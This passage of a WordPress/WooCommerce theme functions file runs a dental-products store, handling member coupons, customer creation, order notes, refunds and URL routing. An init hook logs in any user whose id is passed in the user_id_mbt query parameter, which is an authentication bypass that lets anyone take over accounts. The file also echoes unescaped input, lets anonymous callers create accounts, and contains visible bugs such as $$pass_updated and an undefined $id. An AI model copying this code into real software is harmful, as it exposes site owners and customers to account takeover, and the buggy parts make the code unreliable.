        if ($first_name == '' || $last_name == '' || $email == '' || $member_id == '' || $confirm_member_id == '') {
            $arr = array('status' => false, 'code' => 'All Fields Are required');
            echo json_encode($arr);
            die();
        }
        if (!is_email($email)) {
            $arr = array('status' => false, 'code' => 'Please enter valid email address');
            echo json_encode($arr);
            die();
        }

        if ($member_id != $confirm_member_id) {
            $arr = array('status' => false, 'code' => 'Member Id and confirm member Id do not match');
            echo json_encode($arr);
            die();
        }
        if (strlen($member_id) < 4) {
            $arr = array('status' => false, 'code' => 'Invalid Member Id');
            echo json_encode($arr);
            die();
        }


        $coupon_code = generate_string(); // Code
        $amount = '20'; // Amount
        $discount_type = 'percent'; // Type: fixed_cart, percent, fixed_product, percent_product
        $coupon_code = 'GE' . $coupon_code;
        $coupon = array(
            'post_title' => $coupon_code,
            'post_content' => '',
            'post_status' => 'publish',
            'post_author' => 1,
            'post_type' => 'shop_coupon'
        );

        $new_coupon_id = wp_insert_post($coupon);
        if ($new_coupon_id) {
            set_transient('geha_user', 'yes', 365 * DAY_IN_SECONDS);
            update_post_meta($new_coupon_id, 'discount_type', $discount_type);
            update_post_meta($new_coupon_id, 'coupon_amount', $amount);
            update_post_meta($new_coupon_id, 'individual_use', 'no');
            update_post_meta($new_coupon_id, 'product_ids', '');
            update_post_meta($new_coupon_id, 'exclude_product_ids', '');
            update_post_meta($new_coupon_id, 'usage_limit', '');
            update_post_meta($new_coupon_id, 'expiry_date', '');
            update_post_meta($new_coupon_id, 'apply_before_tax', 'yes');
            update_post_meta($new_coupon_id, 'free_shipping', 'no');
            update_post_meta($new_coupon_id, 'geha_coupon', 'yes');
            register_geha_customer($email, $first_name, $last_name, $member_id);
            $arr = array('status' => true, 'code' => 'Thank you');
        } else {
            $arr = array('status' => false, 'code' => 'SomeThing Went Wrong Please Try Again');
        }
        echo json_encode($arr);
        die();
    }

    function register_geha_customer($email, $first_name = '', $last_name = '', $member_id = '')
    {
        $user_id = username_exists($email);
        if (!$user_id && false == email_exists($email)) {
            $random_password = wp_generate_password($length = 12, false);
            $user_id = wp_create_user($email, $random_password, $email);
            $user_data = new WP_User($user_id);
            $user_data->remove_role('subscriber'); // Optional, you don't have to remove this role if you want to keep subscriber as well
            $user_data->add_role('customer');
            update_user_meta($user_id, 'geha_user', 'yes');
            update_user_meta($user_id, "billing_email", $email);
            update_user_meta($user_id, "billing_first_name", $first_name);
            update_user_meta($user_id, "billing_last_name", $last_name);
            update_user_meta($user_id, "first_name", $first_name);
            update_user_meta($user_id, "last_name", $last_name);
            update_user_meta($user_id, "geha_member_id", $member_id);
            $emails = WC()->mailer()->get_emails();
            $emails['GEHA_SignUp_Email']->trigger($user_id, $random_password);
        } else {
            update_user_meta($user_id, 'geha_user', 'yes');
        }
        setcookie('geha_user', 'yes', time() + (3600 * 24 * 360), '/');
        klaviyo_geha_customer_list($email);
        $_SESSION['geha_user'] = 'yes';
    }

    add_action('wp_ajax_create_woo_customer', 'create_woo_customer');
    add_action('wp_ajax_nopriv_create_woo_customer', 'create_woo_customer');

    function create_woo_customer()
    {
        global $wpdb;
        $cus_first_name = $wpdb->escape($_REQUEST['cus_first_name']);
        $cus_last_name = $wpdb->escape($_REQUEST['cus_last_name']);
        $customer_email = $wpdb->escape($_REQUEST['customer_email']);
        $customer_tags = $wpdb->escape($_REQUEST['customer_tags']);
        $geha_user = $wpdb->escape(isset($_REQUEST['geha_user']) ? $_REQUEST['geha_user'] : '');
        $send_user_email = $wpdb->escape(isset($_REQUEST['send_user_email']) ? $_REQUEST['send_user_email'] : '');

        $errors = '';
        if (empty($cus_first_name)) {
            $errors = "Please enter a first name";
        }
        if (empty($cus_last_name)) {
            $errors = "Please enter a last name";
        }
        // Check email address is present and valid  
        $email = $wpdb->escape($_REQUEST['customer_email']);
        if (!is_email($email)) {
            http_response_code(202);
            $errors = "Please enter a valid email";
        } elseif (email_exists($email)) {
            http_response_code(201);
            $errors = "This email address is already in use";
        }

        if ($errors == '') {

            $password = wp_generate_password(8, false);
            $new_user_id = wp_create_user($email, $password, $email);
            $user_id_role = new WP_User($new_user_id);
            $user_id_role->set_role('customer');
            if ($customer_tags != '') {
                update_user_meta($new_user_id, 'customer_tags', $customer_tags);
            }
            if ($geha_user == 'yes') {
                update_user_meta($new_user_id, 'geha_user', 'yes');
            }
            update_user_meta($new_user_id, "billing_first_name", $cus_first_name);
            update_user_meta($new_user_id, "billing_last_name", $cus_last_name);
            update_user_meta($new_user_id, "shipping_first_name", $cus_first_name);
            update_user_meta($new_user_id, "shipping_last_name", $cus_last_name);
            update_user_meta($new_user_id, "first_name", $cus_first_name);
            update_user_meta($new_user_id, "last_name", $cus_last_name);
            if ($send_user_email == 'yes') {
                $emails = WC()->mailer()->get_emails();
                $emails['WC_Email_Customer_New_Account']->trigger($new_user_id, $password, true);
            }

            // You could do all manner of other things here like send an email to the user, etc. I leave that to you.  

            $success = 1;
            echo '{"status":"1","cusid":"' . $new_user_id . '"}';
        } else {

            echo '{"status":"0","error":"' . $errors . '"}';
        }
        die();
    }

    add_action('wp_ajax_create_woo_order_note', 'create_woo_order_note');

    //add_action('wp_ajax_nopriv_create_woo_order_note', 'create_woo_order_note');

    function create_woo_order_note($order_note = '', $order_id = '', $ret = false)
    {
        global $wpdb;
        if ($order_note == '') {
            $order_note = $wpdb->escape(sanitize_text_field(wp_unslash($_REQUEST['order_note'])));
        }
        if ($order_id == '') {
            $order_id = $wpdb->escape($_REQUEST['order_id']);
        }
        $is_customer_note = $wpdb->escape($_REQUEST['is_customer_note']);
        if ($is_customer_note == '')
            $is_customer_note = 0;

        $errors = '';
        if (empty($order_id)) {
            $errors = "Order Id is Empty";
        }
        if (empty($order_note)) {
            $errors = "Order Note Is Empty";
        }

        if ($errors == '') {

            $order = wc_get_order($order_id);
            $order->add_order_note($order_note, $is_customer_note, get_current_user_id());
            if ($ret) {
                return true;
            }
            echo '{"status":"1"}';
        } else {
            echo '{"status":"0","error":"' . $errors . '"}';
        }
        die();
    }

    add_filter('woocommerce_admin_order_actions', 'add_custom_order_status_actions_button', 100, 2);

    function add_custom_order_status_actions_button($actions, $order)
    {
        // Display the button for all orders that have a 'processing' status
        if ($order->has_status(array('processing')) || $order->has_status(array('on-hold'))) {

            // Get Order ID (compatibility all WC versions)
            $order_id = method_exists($order, 'get_id') ? $order->get_id() : $order->get_id();
            // Set the action button
            $actions['ship'] = array(
                'url' => wp_nonce_url(admin_url('admin-ajax.php?action=woocommerce_mark_order_status&status=ship&order_id=' . $order_id), 'woocommerce-mark-order-status'),
                'name' => __('ship', 'woocommerce'),
                'action' => "view ship", // keep "view" class for a clean button CSS
            );
        }
        $actions['view'] = array(
            'url' => get_edit_post_link($order_id),
            'name' => __('View', 'woocommerce'),
            'action' => "view view-ord", // keep "view" class for a clean button CSS
        );
        $actions['create-note'] = array(
            'url' => '#',
            'name' => __('Add Note', 'woocommerce'),
            'action' => "create-note", // keep "view" class for a clean button CSS
        );
        return $actions;
    }

    add_action('admin_head', 'add_custom_order_status_actions_button_css');

    function add_custom_order_status_actions_button_css()
    {
        $action_slug = "ship"; // The key slug defined for your action button

        echo '<style>.wc_actions.column-wc_actions .ship::after { font-family: Dashicons !important; content: "\f15f" !important; }</style>';
        echo '<style>.wc_actions.column-wc_actions .view-ord::after { font-family: Dashicons !important; content: "\f115" !important; }</style>';
        echo '<style>.wc_actions.column-wc_actions .create-note::after { font-family: Dashicons !important; content: "\f491" !important; }</style>';
    }

    add_filter('woocommerce_admin_order_preview_get_order_details', 'modify_preview_template');

    function modify_preview_template($data)
    {
        $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : '';
        $order = wc_get_order($id);
        $data['ship_to_billing'] = '';
        //$data['data'] = '';
        $data['needs_shipping'] = '';
        $data['formatted_billing_address'] = '';
        $data['formatted_shipping_address'] = '';
        $data['shipping_address_map_url'] = '';
        //$data['item_html'] = get_order_preview_item_html_mbt($order);
        return $data;
    }

    add_filter('woocommerce_admin_order_preview_line_item_columns', 'mnodify_line_item_preview');

    function mnodify_line_item_preview($cols)
    {
        $cols['image'] = __('Image', 'woocommerce');
        $cols['status'] = __('Status', 'woocommerce');
        $cols['tracking'] = __('Tracking', 'woocommerce');

        return $cols;
    }

    add_filter('woocommerce_admin_order_preview_line_item_column_image', 'woocommerce_admin_order_preview_line_item_column_image_mbt', 10, 4);

    function woocommerce_admin_order_preview_line_item_column_image_mbt($dd, $item, $item_id, $order)
    {
        return $product_id = get_the_post_thumbnail($item->get_product_id(), 'thumbnail', 'mbt-item-image');
    }

    add_filter('woocommerce_admin_order_preview_line_item_column_status', 'woocommerce_admin_order_preview_line_item_column__mbt', 10, 4);

    function woocommerce_admin_order_preview_line_item_column__mbt($dd, $item, $item_id, $order)
    {
        return get_order_item_status_mbt($item, $item_id);
    }

    add_filter('woocommerce_admin_order_preview_line_item_column_tracking', 'woocommerce_admin_order_preview_line_item_column_tracking_mbt', 10, 4);

    function woocommerce_admin_order_preview_line_item_column_tracking_mbt($dd, $item, $item_id, $order)
    {

        return get_order_item_tracking_mbt($item_id);
    }

    add_action('init', 'action_checkout_order_processed');

    function action_checkout_order_processed()
    {
        if (isset($_GET['user_id_mbt'])) {
            $user_id = $_GET['user_id_mbt'];
            $str_url = $_SERVER['REQUEST_URI'];
            if (0 == get_current_user_id()) {
                sleep(1);
                wp_set_current_user($user_id);
                wp_set_auth_cookie($user_id, true, false);
            }
            $str_url_new = str_replace("&user_id_mbt=" . $user_id, "", $str_url);
            $str_url_new = $str_url_new . '&sign_on=' . $user_id;
            wp_safe_redirect($str_url_new);
            exit;
        }
        if (isset($_GET['redirected'])) {
            return;
        }
        if (isset($_GET['pay_for_order']) && isset($_GET['key']) && $_GET['pay_for_order'] == 'true') {
            $url = $_SERVER['REQUEST_URI'];
            $url_exp = explode('/', $url);
            $order_id = '';
            if (isset($url_exp[2]) && $url_exp[2] == 'order-pay') {
                $order_id = $url_exp[3];
            }
            if ($order_id != '') {
                $user_id = get_post_meta($order_id, '_customer_user', true);
                if ($user_id != '') {
                    $redirect_to = site_url('/secure-payment/order-id/' . $order_id . '?key=' . $_GET['key']);
                    wp_safe_redirect($redirect_to);
                    exit;
                    //log_in_user_by_pass_mbt($user_id);
                }
            }
        }
        //die();
    }

    function log_in_user_by_pass_mbt($user_id)
    {
        $pass_updated = wp_generate_password(8, false);
        wp_set_password($pass_updated, $user_id);
        $userObj = get_user_by('id', $user_id);
        $creds = array();
        $creds['user_login'] = $userObj->user_login;
        $creds['user_password'] = $$pass_updated;
        $creds['remember'] = true;
        $user = wp_signon($creds, false);
        $redirect_to = site_url($_SERVER['REQUEST_URI'] . '&redirected=true&user_id_mbt=' . $user_id);
        wp_safe_redirect($redirect_to);
        exit;
    }

    function log_in_user_by_id_mbt($user_id)
    {
        if ($userObj = get_user_by('id', $user_id)) {
            if (0 == get_current_user_id()) {
                sleep(1);
                wp_set_current_user($user_id);
                wp_set_auth_cookie($user_id, true, false);
            } else {
              
            }
            //update_user_caches($userObj);
            if (is_user_logged_in()) {
                sleep(1);
                $redirect_to = site_url($_SERVER['REQUEST_URI'] . '&redirected=true&user_id_mbt=' . $user_id);
                wp_safe_redirect($redirect_to);
                exit;
            }
        }
    }

    /*
 * save admin and customer notes on refund
 */
    add_action('wp_ajax_woocommerce_refund_add_note_mbt', 'save_admin_customer_notes_on_refund', 0);

    function save_admin_customer_notes_on_refund()
    {
        $order_id = isset($_POST['order_id']) ? absint($_POST['order_id']) : 0;
        $refund_admin_note = isset($_POST['refund_admin_note']) ? sanitize_text_field(wp_unslash($_POST['refund_admin_note'])) : '';
        $refund_customer_note = isset($_POST['refund_customer_note']) ? sanitize_text_field(wp_unslash($_POST['refund_customer_note'])) : '';

        $order = wc_get_order($order_id);
        if ($refund_admin_note != '') {
            $order->add_order_note($refund_admin_note);
        }
        if ($refund_customer_note != '') {
            $order->add_order_note($refund_customer_note, 1);
        }
        die();
    }

    /*
 * show order refunds by order id
 */

    function order_refunds_meta_box()
    {

        add_meta_box(
            'order-refunds',
            __('Refund History', 'woocommerce'),
            'refund_order_meta_box_callback',
            'shop_order'
        );
    }

    add_action('add_meta_boxes', 'order_refunds_meta_box');

    function refund_order_meta_box_callback($order)
    {

        if ($order) {
            $order = wc_get_order($order->ID);
            $order_refunds = $order->get_refunds();

            if (is_array($order_refunds) && count($order_refunds) > 0) {
                echo '<div class="refund-wrapper" style="overflow: hidden">';
                echo '<div class="refund-reason" style="width:33%;float:left;"><strong>Reason</strong></div>';
                echo '<div class="refund-amount" style="width:33%;float:left"><strong>Amount</strong></div>';
                echo '<div class="refund-amount" style="width:33%;float:left"><strong>Date</strong></div>';
                foreach ($order_refunds as $ref) {

                    if (is_array($ref->data) && count($ref->data) > 0) {

                        $dd = $ref->data;
                        $date_formated = sbr_date($ref->get_date_created()->format('d.m.Y'));
                        $currency = isset($dd['currency']) ? $dd['currency'] : '';
                        $refunddate = isset($dd['date_created']) ? $dd['date_created'] : '';


                        $reason = isset($dd['reason']) ? $dd['reason'] : '';
                        $amount = isset($dd['amount']) ? $dd['amount'] : '';
                        if ($amount != '') {
                            echo '<div class="refund-reason" style="width:33%;float:left">' . $reason . '</div>';
                            echo '<div class="refund-amount" style="width:33%;float:left">' . $amount . ' ' . $currency . '</div>';
                            echo '<div class="refund-date" style="width:33%;float:left">' . $date_formated . '</div>';
                        }
                    }
                }
                echo '</div><style>.refund-reason, .refund-amount, .refund-date {
    min-height: 25px;
}</style>';
            }
    ?>
        <script>
            /*
             * Add customer and admin notes on refund
             */

            jQuery.ajaxPrefilter(function(options, _, jqXHR) {
                var str = options.data;
                if (typeof str !== "undefined") {
                    if (str != '') {
                        str = str.toString();
                        var n = str.includes("refund_line_items");
                        if (n) {

                            admin_note_data = jQuery('#refund_admin_note').val();
                            customer_note_data = jQuery('#refund_customer_note').val();
                            oid = woocommerce_admin_meta_boxes.post_id;
                            new_data = 'refund_admin_note=' + admin_note_data + '&refund_customer_note=' + customer_note_data + '&action=woocommerce_refund_add_note_mbt&order_id=' + oid;

                            //ajaxurl = jQuery('#ajaxurll').val();
                            jQuery.ajax({
                                data: new_data,
                                url: ajaxurl,
                                method: 'POST',
                                type: 'POST',
                                success: function(res) {
                                    if (jQuery('.wc-order-refund-items .wc-order-totals tbody').hasClass('refundAdded')) {
                                        // skip
                                    } else {
                                        add_refund_notes_html();
                                    }
                                }
                            });
                        }
                    }
                }

            });
        </script>
    <?php
        }
    }

    add_filter('woocommerce_general_settings', 'general_settings_shop_phone');

    function general_settings_shop_phone($settings)
    {
        $key = 0;

        foreach ($settings as $values) {
            $new_settings[$key] = $values;
            $key++;

            // Inserting array just after the post code in "Store Address" section
            if ($values['id'] == 'woocommerce_store_postcode') {
                $new_settings[$key] = array(
                    'title' => __('Phone Number'),
                    'desc' => __('Optional phone number of your business office'),
                    'id' => 'woocommerce_store_phone', // <= The field ID (important)
                    'default' => '',
                    'type' => 'text',
                    'desc_tip' => true, // or false
                );
                $key++;
            }
        }
        return $new_settings;
    }

    add_action('manage_shop_order_posts_custom_column', 'mbt_view_customer_profile', 11, 2);

    function mbt_view_customer_profile($column, $post_id)
    {
        if ($column == 'order_number') {
            $user_id = get_post_meta($post_id, '_customer_user', true);
            echo '<a href="/wp-admin/admin.php?page=customer_history&customer_id=' . $user_id . '"> <br />view customer profile</a>';
        }
    }

    // disable refund email
    if (isset($_POST['send_refund_email']) && $_POST['send_refund_email'] == '') {
        $emails = wc()->mailer()->emails;
        remove_action('woocommerce_new_customer_note_notification', array($emails['WC_Email_Customer_Note'], 'trigger'));
    }
    add_filter('init', function () {
        add_rewrite_rule(
            'product/plaque-highlighters/([^/]*)/?',
            // The expected URL
            'index.php?pagename=product/plaque-highlighters-$matches[1]&plaque_type=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'rdh/profile/([^/]*)/?',
            // The expected URL
            'index.php?buddyname=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'rdh/contact/([^/]*)/?',
            // The expected URL
            'index.php?buddyname=$matches[1]',
            'top'
        );

        add_rewrite_rule(
            'rdh/products/([^/]*)/?',
            // The expected URL
            'index.php?buddyname=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'dentist/profile/([^/]*)/?',
            // The expected URL
            'index.php?dentist_name=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'dentist/contact/([^/]*)/?',
            // The expected URL
            'index.php?dentist_name=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'dentist/products/([^/]*)/?',
            // The expected URL
            'index.php?dentist_name=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'dentist/([^/]*)/?',
            // The expected URL
            'index.php?dentist_name=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'rdh/([^/]*)/?',
            // The expected URL
            'index.php?pagename=rdh-register&red-register=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'collection/([^/]*)/?',
            // The expected URL
            'index.php?shop-lander=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'product/dental-probiotics/([^/]*)/?',
            // The expected URL
            'index.php?pagename=product/dental-probiotics-$matches[1]&probiotics=$matches[1]',
            'top'
        );

        add_rewrite_rule(
            'frequently-asked-questions/([^/]*)/?',
            // The expected URL
            'index.php?pagename=frequently-asked-questions&faq_id=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'instructions/([^/]*)/?',
            // The expected URL
            'index.php?pagename=frequently-asked-questions&faq_id=$matches[1]',
            'top'
        );
        add_rewrite_rule(
            'instructions',
            // The expected URL
            'index.php?pagename=frequently-asked-questions&scroll_to=instructions',
            'top'
        );
        add_rewrite_rule(
            'secure-payment/order-id/([^/]*)/?',
            // The expected URL
            'index.php?pagename=secure-payment&pending_order_id=$matches[1]',
            'top'
        );
    });

    add_filter('query_vars', function ($vars) {
        $vars[] = "faq_id";
        $vars[] = "scroll_to";
        $vars[] = "plaque_type";
        $vars[] = "probiotics_type";
        $vars[] = "pending_order_id";
        $vars[] = "red-register";
        $vars[] = "buddyname";
        $vars[] = "dentist_name";
        $vars[] = "shop-lander";

        return $vars;
    });
    add_action('template_include', function ($template) {

        if (get_query_var('buddyname') != false && get_query_var('buddyname') != '') {

            return get_stylesheet_directory() . '/page-templates/rdh-profile.php';
        } else if (get_query_var('dentist_name') != false && get_query_var('dentist_name') != '') {

            return get_stylesheet_directory() . '/page-templates/dentist-profile.php';
        } else if (get_query_var('shop-lander') != false && get_query_var('shop-lander') != '') {
            return get_stylesheet_directory() . '/page-sale-lander-system.php';
        } else {
            return $template;
        }
    });
    function ip_info_mbt($ip = NULL, $purpose = "location", $deep_detect = TRUE)
    {
        $output = NULL;
        if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
            $ip = $_SERVER["REMOTE_ADDR"];
            if ($deep_detect) {
                if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
            }
        }
        $purpose = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
        $support = array("country", "countrycode", "state", "region", "city", "location", "address");
        $continents = array(
            "AF" => "Africa",
            "AN" => "Antarctica",
            "AS" => "Asia",
            "EU" => "Europe",
            "OC" => "Australia (Oceania)",
            "NA" => "North America",
            "SA" => "South America"
        );
        if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
            $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
            if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
                switch ($purpose) {
                    case "location":
                        $output = array(
                            "city" => @$ipdat->geoplugin_city,
                            "state" => @$ipdat->geoplugin_regionName,
                            "country" => @$ipdat->geoplugin_countryName,
                            "country_code" => @$ipdat->geoplugin_countryCode,
                            "continent" => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                            "continent_code" => @$ipdat->geoplugin_continentCode
                        );
                        break;
                    case "address":
                        $address = array($ipdat->geoplugin_countryName);
                        if (@strlen($ipdat->geoplugin_regionName) >= 1)
                            $address[] = $ipdat->geoplugin_regionName;
                        if (@strlen($ipdat->geoplugin_city) >= 1)
                            $address[] = $ipdat->geoplugin_city;
                        $output = implode(", ", array_reverse($address));
                        break;
                    case "city":
                        $output = @$ipdat->geoplugin_city;
                        break;
                    case "state":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "region":
                        $output = @$ipdat->geoplugin_regionName;
                        break;
                    case "country":
                        $output = @$ipdat->geoplugin_countryName;
                        break;
                    case "countrycode":
                        $output = @$ipdat->geoplugin_countryCode;
                        break;
                }
            }
        }
        return $output;
    }

    if (!function_exists('wp_new_user_notification_custom')) {

        function wp_new_user_notification_custom($user_id, $plaintext_pass = '')
        {
            $user = new WP_User($user_id);

            $user_login = stripslashes($user->user_login);
            $user_email = stripslashes($user->user_email);

            $message = sprintf(__('New user registration on your blog %s:'), get_option('blogname')) . "rnrn";
            $message .= sprintf(__('Username: %s'), $user_login) . "rnrn";
            $message .= sprintf(__('E-mail: %s'), $user_email) . "rn";

            @wp_mail(get_option('admin_email'), sprintf(__('[%s] New User Registration'), get_option('blogname')), $message);

            if (empty($plaintext_pass))
                return;

            $message = __('Hi there,') . "rnrn";
            $message .= sprintf(__("Welcome to %s! Here's how to log in:"), get_option('blogname')) . "rnrn";
            $message .= wp_login_url() . "rn";
            $message .= sprintf(__('Username: %s'), $user_login) . "rn";
            $message .= sprintf(__('Password: %s'), $plaintext_pass) . "rnrn";
            $message .= sprintf(__('If you have any problems, please contact me at %s.'), get_option('admin_email')) . "rnrn";
            $message .= __('Adios!');

            wp_mail($user_email, sprintf(__('[%s] Your username and password'), get_option('blogname')), $message);
        }
    }

    function add_to_cart_validation_composite_product($product_id)
    {
        return true;
        $component_data = get_post_meta($product_id, '_bto_data', true);
        //    echo '<pre>';
        //    print_r($component_data);
        //    die();
        if (is_array($component_data) && count($component_data) > 0) {
            foreach ($component_data as $key => $comp) {
                $component_id = isset($comp['default_id']) ? $comp['default_id'] : '';
                $min_qty = isset($comp['quantity_min']) ? $comp['quantity_min'] : 0;
                if ($component_id != '') {
                    $avaiable_stock = get_post_meta($component_id, '_stock', true);
                    if ($avaiable_stock > 0 && $avaiable_stock > $min_qty) {
                        //
                    } else {
                        return true;
                        // break;
                    }
                }
            }
            return true;
        }
        return true;
    }

    add_action('init', function () {
        if (isset($_GET['page']) && $_GET['page'] == 'warranties-new' && isset($_GET['search_term']) && $_GET['search_term'] != '') {
    ?>
        <script>
            var parents_only = [];
        </script>
        <style>
            .alternate .order-items {
                display: none;
            }
        </style>
        <?php
            $order_id = $_GET['search_term'];
            $order = wc_get_order($order_id);
            $simple_products = array();
            $flagOrderStatus = false;
            foreach ($order->get_items() as $item_id => $item) {
                $log_visible = false;
                if (wc_cp_get_composited_order_item_container($item, $order)) {
                } else if (wc_cp_is_composite_container_order_item($item)) {
        ?>
                <script>
                    parents_only.push('<?php echo $item_id ?>');
                </script>
            <?php
                    $log_visible = true;
                } else {
                    $log_visible = true;
            ?>
                <script>
                    parents_only.push(['<?php echo $item_id ?>']);
                </script>
        <?php
                }
            }
        }
    });

    function register_trash_page()
    {
        global $current_user;
        $user_id = get_current_user_id();
        $user_is_csr = get_user_meta($user_id, 'user_is_csr', true);
        if ($user_is_csr != 'yes') {
            add_submenu_page('woocommerce', 'Trash orders', 'Trash orders', 'manage_options', 'edit.php?post_status=trash&post_type=shop_order');
        }
    }

    add_action('admin_menu', 'register_trash_page');
    /*
 * update capibilities
 */

    function hide_menu_force_csr()
    {
        global $current_user;
        $user_id = get_current_user_id();
        $user_is_csr = get_user_meta($user_id, 'user_is_csr', true);

        // echo "user:".$user_id;   // Use this to find your user id quickly
        remove_menu_page('edit.php?post_status=trash&post_type=shop_order');
        if ($user_id != '' && $user_is_csr == 'yes') {

            remove_menu_page('admin.php?page=theme-options');
            remove_all_actions('admin_notices');
            remove_menu_page('plugins.php');
            remove_menu_page('options-general.php');
            remove_menu_page('themes.php');
            remove_menu_page('tools.php');
            //  remove_menu_page('users.php');
            remove_menu_page('edit.php?post_type=acf-field-group');
            remove_menu_page('thb-product-registration');
            remove_menu_page('wpseo_dashboard');
            remove_menu_page('klaviyo_settings');
            remove_menu_page('woo-product-feed-pro/woocommerce-sea.php');
            remove_menu_page('vx-addons');
            remove_menu_page('import-lagacy-data');
        }
    }

    add_action('admin_menu', 'hide_menu_force_csr', 99);

    function hide_toolbar_sbr()
    {
        global $current_user;
        $user_id = get_current_user_id();
        $user_is_csr = get_user_meta($user_id, 'user_is_csr', true);

        // echo "user:".$user_id;   // Use this to find your user id quickly

        if ($user_id != '' && $user_is_csr == 'yes') {
            echo '<style>
    #wp-admin-bar-root-default {
    display: none !important;
} 
  </style>';
        }
    }

    add_action('admin_head', 'hide_toolbar_sbr');
    add_action('wp_head', 'hide_toolbar_sbr');
    add_action('show_user_profile', 'sbr_show_extra_profile_fields');
    add_action('add_user_profile', 'sbr_show_extra_profile_fields');
    add_action('edit_user_profile', 'sbr_show_extra_profile_fields');

    function sbr_show_extra_profile_fields($user)
    {
        $user_is_csr = get_user_meta($user->ID, 'user_is_csr', true);
        $customer_tags = get_user_meta($user->ID, 'customer_tags', true);
        $authorize_failed_attempt_count = get_user_meta($user->ID, 'authorize_failed_attempt_count', true);
        //print_r($customer_tags);

        if (is_array($customer_tags) && in_array('influencer', $customer_tags)) {
            $influencer_selected = 'selected="selected"';
        } else {
            $influencer_selected = '';
        }
        if (is_array($customer_tags) && in_array('reseller', $customer_tags)) {
            $reseller_selected = 'selected="selected"';
        } else {
            $reseller_selected = '';
        }
        if (is_array($customer_tags) && in_array('wholesale', $customer_tags)) {
            $wholesale_selected = 'selected="selected"';
        } else {
            $wholesale_selected = '';
        }
        if ($user->ID == get_current_user_id()) {
            //
        } else {
            if ($user_is_csr == 'yes') {
                $checked_mar = 'checked';
            } else {
                $checked_mar = '';
            }
            $selected_user = isset($_GET['user_id']) ? $_GET['user_id'] : 0;
            if ($selected_user) {
            $user_meta = get_userdata($selected_user);
            if ($user_meta && !empty($user_meta->roles)) {
            $user_roles = $user_meta->roles;
        ?>


        <table class="form-table">
            <?php
            if (in_array('administrator', $user_roles, true)) {
            ?>
                <tr class="show-admin-bar user-admin-bar-front-wrap">
                    <th scope="row">Csr User</th>
                    <td>
                        <label for="csr_user">
                            <input name="csr_user" type="checkbox" id="csr_user" value="yes" <?php echo $checked_mar; ?>>
                            Make this user a CSR</label><br>
                    </td>
                </tr>
            <?php
            }
            ?>

            <tr class="show-admin-bar user-admin-bar-front-wrap">
                <th scope="row">User Tags</th>
                <td>
                    <div style="position:relative"><label for="customer_tags">
                            <select autocomplete="on" name="customer_tags[]" id="customer_tags" multiple>

                                <option value="influencer" <?php echo $influencer_selected; ?>>Influencer</option>
                                <option value="reseller" <?php echo $reseller_selected; ?>>Reseller</option>
                                <option value="wholesale" <?php echo $wholesale_selected; ?>>Wholesale</option>
                            </select></label></div>
                </td>
                <script>
                    jQuery('#customer_tags').select2();
                </script>

            </tr>
            <tr class="show-admin-bar user-admin-bar-front-wrap">
                <th scope="row">Authorize.net failed login attempts</th>
                <td>

                    <input name="authorize_failed_attempt_count" type="text" id="authorize_failed_attempt_count" value="<?php echo $authorize_failed_attempt_count; ?>" />

                </td>
            </tr>
        </table>
    <?php
            }
            }
        }
    }

    add_action('user_profile_update_errors', 'sbr_user_profile_update_errors', 10, 3);

    function sbr_user_profile_update_errors($errors, $update, $user)
    {
        if (!$update) {
            return;
        }
    }

    add_action('personal_options_update', 'sbr_update_profile_fields');
    add_action('edit_user_profile_update', 'sbr_update_profile_fields');

    function sbr_update_profile_fields($user_id)
    {
        if (!current_user_can('edit_user', $user_id)) {
            return false;
        }


        if (isset($_POST['csr_user'])) {
            update_user_meta($user_id, 'user_is_csr', $_POST['csr_user']);
        } else {

            update_user_meta($user_id, 'user_is_csr', 'no');
        }
        if (isset($_POST['customer_tags'])) {

            update_user_meta($user_id, 'customer_tags', $_POST['customer_tags']);
        }
        if (isset($_POST['authorize_failed_attempt_count'])) {

            update_user_meta($user_id, 'authorize_failed_attempt_count', $_POST['authorize_failed_attempt_count']);
        }
    }

    /*
 * get refund reasons
 */
    add_action('wp_ajax_get_refund_reason_order_listing', 'get_refund_reason_order_listing');

    function get_refund_reason_order_listing($order_id = '')
    {
        $html = '';
        if ($order_id == '') {
            $order_id = $_POST['order_id'];
        }
        if ($order_id == '') {
            //
        } else {
            $order = wc_get_order($order_id);
            $order_refunds = $order->get_refunds();
            $html = '';
            if (is_array($order_refunds) && count($order_refunds) > 0) {
                $html .= '<ul class="refund-reason-sbr">';

                foreach ($order_refunds as $ref) {

                    if (is_array($ref->data) && count($ref->data > 0)) {

                        $dd = $ref->data;
                        $date_formated = sbr_date($ref->get_date_created()->format('d.m.Y'));
                        $currency = isset($dd['currency']) ? $dd['currency'] : '';
                        $refunddate = isset($dd['date_created']) ? $dd['date_created'] : '';


                        $reason = isset($dd['reason']) ? $dd['reason'] : '';
                        $amount = isset($dd['amount']) ? $dd['amount'] : '';
                        if ($amount != '') {
                            $html .= '<li>Reason: ' . $reason . ' Date: ' . $date_formated . ' Amount: ' . $currency . $amount . '</li>';
                        }
                    }
                }
                $html .= '</ul>';
            }
        }
        echo $html;
        die();
    }

    /*
 * get order notes by oder id
 */
    add_action('wp_ajax_get_order_customer_notes_by_orderid', 'get_order_customer_notes_by_orderid');

    function get_order_customer_notes_by_orderid($order_id = '')
    {
        $html = '';
        if ($order_id == '') {
